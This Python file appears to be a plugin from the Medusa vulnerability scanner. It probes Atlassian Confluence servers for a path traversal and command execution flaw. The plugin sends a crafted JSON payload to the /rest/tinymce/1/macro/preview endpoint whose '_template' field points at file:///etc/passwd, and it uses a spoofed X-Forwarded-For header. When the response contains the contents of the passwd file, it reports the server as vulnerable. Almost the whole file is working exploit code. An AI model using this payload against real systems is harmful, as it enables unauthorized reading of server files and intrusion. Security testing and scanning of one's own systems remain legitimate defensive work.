#!/usr/bin/env python
# _*_ coding: utf-8 _*_
import urllib.parse
import requests
import ClassCongregation


class VulnerabilityInfo(object):
    def __init__(self, Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['disclosure'] = '2019-10-13'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "AtlassianConfluencePathTraversalAndCommandExecutionVulnerability"  # 插件名称
        self.info['name'] = 'AtlassianConfluence路径穿越与命令执行漏洞'  # 漏洞名称
        self.info['affects'] = "Confluence"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果


def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

PayloadPost='''{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}'''
Payload="/rest/tinymce/1/macro/preview"
def medusa(Url,RandomAgent,Token,proxies=None):
    proxies=ClassCongregation.Proxies().result(proxies)
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    PayloadUrl = scheme+"://"+url+':'+str(port)+Payload
    Referers = scheme + "://" + url + ':' + str(port)
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept': 'text/plain, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'User-Agent': RandomAgent,
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json; charset=utf-8',
        'Referer': Referers,
        'Content-Length': '167',
        'X-Forwarded-For': '127.0.0.2',
        'Connection': 'keep-alive'

    }
    s = requests.session()
    try:
        resp = s.post(PayloadUrl, data=PayloadPost,proxies=proxies, headers=headers, timeout=5)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('bin')!=-1 and con.lower().find('root')!=-1 :
            Medusa = "{}存在AtlassianConfluence路径穿越与命令执行漏洞 \r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, PayloadUrl,PayloadPost)
            _t = VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,Token).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l=ClassCongregation.ErrorLog().Write(url,_)#调用写入类